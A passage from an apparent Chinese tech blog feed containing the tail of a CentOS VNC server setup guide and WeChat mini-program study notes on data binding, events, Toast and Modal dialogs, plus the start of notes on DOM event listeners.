id="五：配置多个桌面"><a href="#五：配置多个桌面" class="headerlink" title="五：配置多个桌面"></a>五：配置多个桌面</h2><p>可以使用如下的方法启动多个桌面的VNC：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">vncserver</span> :<span class="number">1</span></span><br><span class="line"><span class="attribute">vncserver</span> :<span class="number">2</span></span><br><span class="line"><span class="attribute">vncserver</span> :<span class="number">3</span></span><br></pre></td></tr></table></figure><p>但是这种手工启动的方法在服务器重新启动之后将失效，因此，下面介绍如何让系统自动管理多个桌面的VNC，方法是将需要自动管理的信息添加到&#x2F;etc&#x2F;sysconfig&#x2F;vncservers配置文件中，先以桌面1为root用户桌面2为oracle用户为例进行配置如下：<br>格式为：VNCSERVERS&#x3D;”桌面号:使用的用户名 桌面号:使用的用户名”</p><p>执行vi &#x2F;etc&#x2F;sysconfig&#x2F;vncservers命令，添加配置：可根据你自己的用户具体配置，这里我配置了root和aiuap用户</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">VNCSERVERS</span><span class="operator">=</span><span class="string">&quot;1:root 2:aiuap&quot;</span></span><br><span class="line">VNCSERVERARGS[<span class="number">1</span>]<span class="operator">=</span><span class="string">&quot;-geometry 1024x768&quot;</span></span><br><span class="line">VNCSERVERARGS[<span class="number">2</span>]<span class="operator">=</span><span class="string">&quot;-geometry 1024x768&quot;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\Administrator\Desktop\博客Blog\blog_VNC7.jpg" alt="img"></p><h2 id="六：vnc服务管理"><a href="#六：vnc服务管理" class="headerlink" title="六：vnc服务管理"></a>六：vnc服务管理</h2><p>a：修改vnc访问密码</p><p>使用命令vncpasswd对不同用户的VNC的密码进行修改，一定要注意，如果配置了不同用户的VNC需要分别到各自用户中进行修改，如我用root用户执行了vncpasswd命令，则只会修改root用户的vnc密码，其他用户不受影响：</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC8.jpg" alt="img"></p><p>b：启动vnc服务</p><p>基于第五步的基础，已经在配置文件中配置好用户对应的桌面号，执行service vncserver start命令，即可启动所有的用户对应的vnc服务</p><p><img src="C:\Users\Administrator\Desktop\博客Blog\blog_VNC9.jpg" alt="img"></p><p>c：停止vnc服务</p><p>同样也是基于第五的基础，执行service vncserver stop命令，即可关闭配置文件中所有用户对应的vnc服务</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC10.jpg" alt="img"></p><h2 id="七：客户端连接安装启动好的vnc服务端"><a href="#七：客户端连接安装启动好的vnc服务端" class="headerlink" title="七：客户端连接安装启动好的vnc服务端"></a>七：客户端连接安装启动好的vnc服务端</h2><p>下载VNC Viewer到自己的本地机器，双击vnc viewer启动程序</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/blog_VNC11.png"></p><p>服务器输入vnc服务端安装所在机器地址，后面的数字序号与vncserver启动时vncserver :1后面跟着的桌面号相同(如果配置了第五步和VNCSERVERS&#x3D;”1:root 2:aiuap”中桌面号相同即可)，我这里如果写1则为root用户连接进入10.165.38.68，如果为2则为aiuap用户连接进入10.165.38.68服务器</p><p>点击确定后，会让你输入密码，该处的密码与第二步中启动vncserver输入的密码一致即可</p><p>点击确定，就能进入文章开头说的那种界面了，可以看到右上角显示进入该服务器的用户名用1进入为root，用2进入为aiuap</p>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> VNC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 05</title>
      <link href="/2021/09/04/33bf77d73300-q1jun/"/>
      <url>/2021/09/04/33bf77d73300-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-05"><a href="#微信小程序学习笔记-05" class="headerlink" title="微信小程序学习笔记 05"></a>微信小程序学习笔记 05</h1><p>为小程序加入 JavaScript 脚本，做出动态效果，以及如何跟用户互动。学会了脚本，就能做出复杂的页面了。</p><h2 id="0x01-数据绑定"><a href="#0x01-数据绑定" class="headerlink" title="0x01 数据绑定"></a>0x01 数据绑定</h2><p>前面的所有示例，小程序的页面都是写死的，也就是页面内容不会变。但是，页面数据其实可以通过脚本传入，通过脚本改变页面，实现动态效果。</p><p>小程序提供了一种特别的方法，让页面可以更方便地使用脚本数据，叫做”数据绑定”（data binding）。</p><p>所谓”数据绑定”，指的是脚本里面的某些数据，会自动成为页面可以读取的全局变量，两者会同步变动。也就是说，脚本里面修改这个变量的值，页面会随之变化；反过来，页面上修改了这段内容，对应的脚本变量也会随之变化。这也叫做 MVVM 模式。</p><p>下面看一个例子。打开<code>index.js</code>文件，打开成下面这样。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 页面的初始数据</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="attr">data</span>: &#123;</span><br><span class="line">        <span class="attr">time</span>:(<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toString</span>(),</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Page()</code>方法的配置对象有一个<code>data</code>属性。这个属性的值也是一个对象，有一个<code>time</code>属性。数据绑定机制规定，<code>data</code>对象的所有属性，自动成为当前页面可以读取的全局变量。也就是说，<code>index</code>页面可以自动读取<code>time</code>变量。</p><p>接着，修改<code>index.wxml</code>文件，加入<code>time</code>变量。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>当前时间为：&#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>time</code>变量写在<code>&#123;&#123;...&#125;&#125;</code>里面。这是小程序特有的语法，两重大括号表示，内部不是文本，而是 JavaScript 代码，它的执行结果会写入页面。因此，<code>&#123;&#123;time&#125;&#125;</code>表示读取全局变量<code>name</code>的值，将这个值写入网页。</p><p>注意，变量名区分大小写，<code>time</code>和<code>Time</code>是两个不同的变量名。</p><p>开发者工具导入项目代码，页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114151911682.png" alt="image-20220114151911682"></p><p>可以看到，<code>time</code>变量已经自动替换成了变量值”Fri Jan 14 2022 15:21:02 GMT+0800 (中国标准时间)”。</p><h2 id="0x02-全局数据"><a href="#0x02-全局数据" class="headerlink" title="0x02 全局数据"></a>0x02 全局数据</h2><p>数据绑定只对当前页面有效，如果某些数据要在多个页面共享，就需要写到全局配置对象里面。</p><p>打开<code>app.js</code>，改写如下。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">App</span>(&#123;</span><br><span class="line">  <span class="attr">globalData</span>: &#123;</span><br><span class="line">    <span class="attr">now</span>: (<span class="keyword">new</span> <span class="title class_">Date</span>()).<span class="title function_">toLocaleString</span>()</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>App()</code>方法的参数配置对象有一个<code>globalData</code>属性，这个属性就是我们要在多个页面之间分享的值。事实上，配置对象的任何一个属性都可以共享，这里起名为<code>globalData</code>只是为了便于识别。</p><p>然后，打开<code>index.js</code>，增加下面的内容，在页面脚本里面获取全局对象。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="title function_">getApp</span>();</span><br><span class="line"></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">time</span>: app.<span class="property">globalData</span>.<span class="property">now</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>getApp()</code>函数是小程序原生提供的函数方法，用于从页面获取 App 实例对象。拿到实例对象以后，就能从它上面拿到全局配置对象的<code>globalData</code>属性，从而把<code>app.globalData.now</code>赋值给页面脚本的<code>time</code>属性，进而通过数据绑定机制，变成页面的全局变量<code>now</code>。</p><p>最后，修改一下页面代码<code>index.wxml</code>。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">view</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>当前时间为 &#123;&#123;time&#125;&#125;<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">view</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开发者工具导入项目代码，页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114193439963.png" alt="image-20220114193439963"></p><h2 id="0x03-事件"><a href="#0x03-事件" class="headerlink" title="0x03 事件"></a>0x03 事件</h2><p>事件是小程序跟用户互动的主要手段。小程序通过接收各种用户事件，执行回调函数，做出反应。</p><p>小程序的<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/event.html">常见事件</a>有下面这些。</p><ul><li><code>tap</code>：触摸后马上离开。</li><li><code>longpress</code>：触摸后，超过 350ms 再离开。如果指定了该事件的回调函数并触发了该事件，<code>tap</code>事件将不被触发。</li><li><code>touchstart</code>：触摸开始。</li><li><code>touchmove</code>：触摸后移动。</li><li><code>touchcancel</code>：触摸动作被打断，如来电提醒，弹窗等。</li><li><code>touchend</code>：触摸结束。</li></ul><p>上面这些事件，在传播上分成两个阶段：先是捕获阶段（由上层元素向下层元素传播），然后是冒泡阶段（由下层元素向上层元素传播）。所以，同一个事件在同一个元素上面其实会触发两次：捕获阶段一次，冒泡阶段一次。详细的介绍，请参考<a target="_blank" rel="noopener" href="https://blog.q1jun.cn/?p=241">微信小程序学习笔记 04</a>。</p><p>小程序允许页面元素，通过属性指定各种事件的回调函数，并且还能够指定是哪个阶段触发回调函数。具体方法是为事件属性名加上不同的前缀。小程序提供四种前缀。</p><ul><li><code>capture-bind</code>：捕获阶段触发。</li><li><code>capture-catch</code>：捕获阶段触发，并中断事件，不再向下传播，即中断捕获阶段，并取消随后的冒泡阶段。</li><li><code>bind</code>：冒泡阶段触发。</li><li><code>catch</code>：冒泡阶段触发，并取消事件进一步向上冒泡。</li></ul><p>下面通过一个例子，来看如何为事件指定回调函数。打开<code>index.wxml</code>文件，改成下面的代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">text</span> <span class="attr">class</span>=<span class="string">&quot;title&quot;</span>&gt;</span>Hello &#123;&#123;name&#125;&#125; !!<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">class</span>=<span class="string">&quot;weui-btn weui-btn_primary&quot;</span> <span class="attr">bind:tap</span>=<span class="string">&quot;buttonHandler&quot;</span>&gt;</span></span><br><span class="line">    点击</span><br><span class="line"><span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，我们为页面加上了一个按钮，并为这个按钮指定了触摸事件（<code>tap</code>）的回调函数<code>buttonHandler</code>，<code>bind:</code>前缀表示这个回调函数会在冒泡阶段触发（前缀里面的冒号可以省略，即写成<code>bindtap</code>也可以）。</p><p>回调函数必须在页面脚本中定义。打开<code>index.js</code>文件，改成下面的代码。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Guest&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">buttonHandler</span>(<span class="params">event</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;q1jun&#x27;</span></span><br><span class="line">      &#125;);</span><br><span class="line"> &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Page()</code>方法的参数配置对象里面，定义了<code>buttonHandler()</code>，这就是<code>&lt;button&gt;</code>元素的回调函数。它有几个地方需要注意。</p><p>（1）事件回调函数的参数是事件对象<code>event</code>，可以从它上面获取<a target="_blank" rel="noopener" href="https://developers.weixin.qq.com/miniprogram/dev/framework/view/wxml/event.html">事件信息</a>，比如事件类型、发生时间、发生节点、当前节点等等。</p><p>（2）事件回调函数内部的<code>this</code>，指向页面实例。</p><p>（3）页面实例的<code>this.setData()</code>方法，可以更改配置对象的<code>data</code>属性，进而通过数据绑定机制，导致页面上的全局变量发生变化。</p><p>开发者工具导入项目代码，点击按钮后，页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114201233780.png" alt="image-20220114201233780"></p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114201209629.png" alt="image-20220114201209629"></p><p>可以看到，点击按钮以后，页面的文字从”hello 张三”变成了”hello 李四”。</p><h2 id="0x04-动态提示-Toast"><a href="#0x04-动态提示-Toast" class="headerlink" title="0x04 动态提示 Toast"></a>0x04 动态提示 Toast</h2><p>小程序提供了很多组件和方法，用来增强互动效果。比如，每次操作后，都显示一个动态提示，告诉用户操作的结果，这种效果叫做 Toast。</p><p>打开<code>index.js</code>文件，为<code>this.setData()</code>加上第二个参数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Guest&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">buttonHandler</span>(<span class="params">event</span>) &#123;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">setData</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;q1jun&#x27;</span></span><br><span class="line">      &#125;, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">          <span class="attr">title</span>: <span class="string">&#x27;操作完成&#x27;</span>,</span><br><span class="line">          <span class="attr">duration</span>: <span class="number">700</span></span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;)</span><br><span class="line">   &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>this.setData()</code>方法加入了第二个参数，这是一个函数，它会在页面变更完毕后（即<code>this.setData()</code>执行完）自动调用。</p><p>这个参数函数内部，调用了<code>wx.showToast()</code>方法，<code>wx</code>是小程序提供的原生对象，所有客户端 API 都定义在这个对象上面，<code>wx.showToast()</code>会展示微信内置的动态提示框，它的参数对象的<code>title</code>属性指定提示内容，<code>duration</code>属性指定提示框的展示时间，单位为毫秒。</p><p>开发者工具导入项目代码，点击按钮后，页面渲染结果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114202521614.png" alt="image-20220114202521614"></p><h2 id="0x05-对话框-Modal"><a href="#0x05-对话框-Modal" class="headerlink" title="0x05 对话框 Modal"></a>0x05 对话框 Modal</h2><p>下面，我们再用小程序提供的<code>wx.showModal()</code>方法，制作一个对话框，即用户可以选择”确定”或”取消”。</p><p>打开<code>index.js</code>文件，修改如下。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Page</span>(&#123;</span><br><span class="line">  <span class="attr">data</span>: &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&#x27;Guest&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="title function_">buttonHandler</span>(<span class="params">event</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> that = <span class="variable language_">this</span>;</span><br><span class="line">    wx.<span class="title function_">showModal</span>(&#123;</span><br><span class="line">      <span class="attr">title</span>: <span class="string">&quot;确认操作&quot;</span>,</span><br><span class="line">      <span class="attr">content</span>: <span class="string">&quot;你确认要修改吗？&quot;</span>,</span><br><span class="line">      success (res) &#123;</span><br><span class="line">        <span class="keyword">if</span> (res.<span class="property">confirm</span>) &#123;</span><br><span class="line">          that.<span class="title function_">setData</span>(&#123;</span><br><span class="line">            <span class="attr">name</span>: <span class="string">&quot;q1jun&quot;</span></span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            wx.<span class="title function_">showToast</span>(&#123;</span><br><span class="line">              <span class="attr">title</span>: <span class="string">&#x27;操作完成&#x27;</span>,</span><br><span class="line">              <span class="attr">duration</span>: <span class="number">700</span></span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (res.<span class="property">cancel</span>) &#123;</span><br><span class="line">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;用户点击取消&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">cancelColor</span>: <span class="string">&#x27;cancelColor&#x27;</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">   &#125;,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，用户点击按钮以后，回调函数<code>buttonHandler()</code>里面会调用<code>wx.showModal()</code>方法，显示一个对话框，效果如下。</p><p><img src="https://q1jun-tc.oss-cn-shenzhen.aliyuncs.com/uPic/image-20220114204949016.png" alt="image-20220114204949016"></p><p><code>wx.showModal()</code>方法的参数是一个配置对象。<code>title</code>属性表示对话框的标题（本例为”操作确认”），<code>content</code>属性表示对话框的内容（本例为”你确认要修改吗？”），<code>success</code>属性指定对话框成功显示后的回调函数，<code>fail</code>属性指定显示失败时的回调函数。</p><p><code>success</code>回调函数里面，需要判断一下用户到底点击的是哪一个按钮。如果参数对象的<code>confirm</code>属性为<code>true</code>，点击的就是”确定”按钮，<code>cancel</code>属性为<code>true</code>，点击的就是”取消”按钮。</p><p>这个例子中，用户点击”取消”按钮后，对话框会消失，控制台会输出一行提示信息。点击”确定”按钮后，对话框也会消失，并且还会去调用<code>that.setData()</code>那些逻辑。</p><p>注意，上面代码写的是<code>that.setData()</code>，而不是<code>this.setData()</code>。这是因为<code>setData()</code>方法定义在页面实例上面，但是由于<code>success()</code>回调函数不是直接定义在<code>Page()</code>的配置对象下面，<code>this</code>不会指向页面实例，导致<code>this.setData()</code>会报错。解决方法就是在<code>buttonHandler()</code>的开头，将<code>this</code>赋值给变量<code>that</code>，然后在<code>success()</code>回调函数里面使用<code>that.setData()</code>去调用。关于<code>this</code>更详细的解释，可以参考<a target="_blank" rel="noopener" href="https://blog.q1jun.cn/?p=219">微信小程序学习笔记 04</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 前端学习 </category>
          
          <category> 微信小程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
            <tag> 小程序 </tag>
            
            <tag> WeChat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序学习笔记 04</title>
      <link href="/2021/09/03/50dfe4d83351-q1jun/"/>
      <url>/2021/09/03/50dfe4d83351-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="微信小程序学习笔记-04"><a href="#微信小程序学习笔记-04" class="headerlink" title="微信小程序学习笔记 04"></a>微信小程序学习笔记 04</h1><h2 id="0x01-事件模型"><a href="#0x01-事件模型" class="headerlink" title="0x01 事件模型"></a>0x01 事件模型</h2><h3 id="0x0101-监听函数"><a href="#0x0101-监听函数" class="headerlink" title="0x0101 监听函数"></a>0x0101 监听函数</h3><p>浏览器的事件模型，就是通过监听函数（listener）对事件做出反应。事件发生后，浏览器监听到了这个事件，就会执行对应的监听函数。这是事件驱动编程模式（event-driven）的主要编程方式。</p><p>JavaScript 有三种方法，可以为事件绑定监听函数。</p><h4 id="0x010101-HTML-的-on-属性"><a href="#0x010101-HTML-的-on-属性" class="headerlink" title="0x010101 HTML 的 on- 属性"></a>0x010101 HTML 的 on- 属性</h4><p>HTML 语言允许在元素的属性中，直接定义某些事件的监听代码。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething()&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(&#x27;触发事件&#x27;)&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码为<code>body</code>节点的<code>load</code>事件、<code>div</code>节点的<code>click</code>事件，指定了监听代码。一旦事件发生，就会执行这段代码。</p><p>元素的事件监听属性，都是<code>on</code>加上事件名，比如<code>onload</code>就是<code>on + load</code>，表示<code>load</code>事件的监听代码。</p><p>注意，这些属性的值是将会执行的代码，而不是一个函数。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 正确 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething()&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 错误 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;doSomething&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>一旦指定的事件发生，<code>on-</code>属性的值是原样传入 JavaScript 引擎执行。因此如果要执行函数，不要忘记加上一对圆括号。</p><p>使用这个方法指定的监听代码，只会在冒泡阶段触发。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(2)&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">&quot;console.log(1)&quot;</span>&gt;</span>点击<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>&lt;button&gt;</code>是<code>&lt;div&gt;</code>的子元素。<code>&lt;button&gt;</code>的<code>click</code>事件，也会触发<code>&lt;div&gt;</code>的<code>click</code>事件。由于<code>on-</code>属性的监听代码，只在冒泡阶段触发，所以点击结果是先输出<code>1</code>，再输出<code>2</code>，即事件从子元素开始冒泡到父元素。</p><p>直接设置<code>on-</code>属性，与通过元素节点的<code>setAttribute</code>方法设置<code>on-</code>属性，效果是一样的。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">el.<span class="title function_">setAttribute</span>(<span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;doSomething()&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="comment">// &lt;Element onclick=&quot;doSomething()&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="0x010102-元素节点的事件属性"><a href="#0x010102-元素节点的事件属性" class="headerlink" title="0x010102 元素节点的事件属性"></a>0x010102 元素节点的事件属性</h4><p>元素节点对象的事件属性，同样可以指定监听函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = doSomething;</span><br><span class="line"></span><br><span class="line">div.<span class="property">onclick</span> = <span class="keyword">function</span> (<span class="params">event</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;触发事件&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>使用这个方法指定的监听函数，也是只会在冒泡阶段触发。</p><p>注意，这种方法与 HTML 的<code>on-</code>属性的差异是，它的值是函数名（<code>doSomething</code>），而不像后者，必须给出完整的监听代码（<code>doSomething()</code>）。</p><h4 id="0x010103-EventTarget-addEventListener"><a href="#0x010103-EventTarget-addEventListener" class="headerlink" title="0x010103 EventTarget.addEventListener()"></a>0x010103 EventTarget.addEventListener()</h4><p>所有 DOM 节点实例都有<code>addEventListener</code>方法，用来为该节点定义事件的监听函数。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;load&#x27;</span>, doSomething, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h4 id="0x010104-小结"><a href="#0x010104-小结" class="headerlink" title="0x010104 小结"></a>0x010104 小结</h4><p>上面三种方法，第一种“HTML 的 on- 属性”，违反了 HTML 与 JavaScript 代码相分离的原则，将两者写在一起，不利于代码分工，因此不推荐使用。</p><p>第二种“元素节点的事件属性”的缺点在于，同一个事件只能定义一个监听函数，也就是说，如果定义两次<code>onclick</code>属性，后一次定义会覆盖前一次。因此，也不推荐使用。</p><p>第三种<code>EventTarget.addEventListener</code>是推荐的指定监听函数的方法。它有如下优点：</p><ul><li>同一个事件可以添加多个监听函数。</li><li>能够指定在哪个阶段（捕获阶段还是冒泡阶段）触发监听函数。</li><li>除了 DOM 节点，其他对象（比如<code>window</code>、<code>XMLHttpRequest</code>等）也有这个接口，它等于是整个 JavaScript 统一的监听函数接口。</li></ul><h3 id="0x0102-this-的指向"><a href="#0x0102-this-的指向" class="headerlink" title="0x0102 this 的指向"></a>0x0102 this 的指向</h3><p>监听函数内部的<code>this</code>指向触发事件的那个元素节点。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button id=<span class="string">&quot;btn&quot;</span> onclick=<span class="string">&quot;console.log(this.id)&quot;</span>&gt;点击&lt;/button&gt;</span><br></pre></td></tr></table></figure><p>执行上面代码，点击后会输出<code>btn</code>。</p><p>其他两种监听函数的写法，<code>this</code>的指向也是如此。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 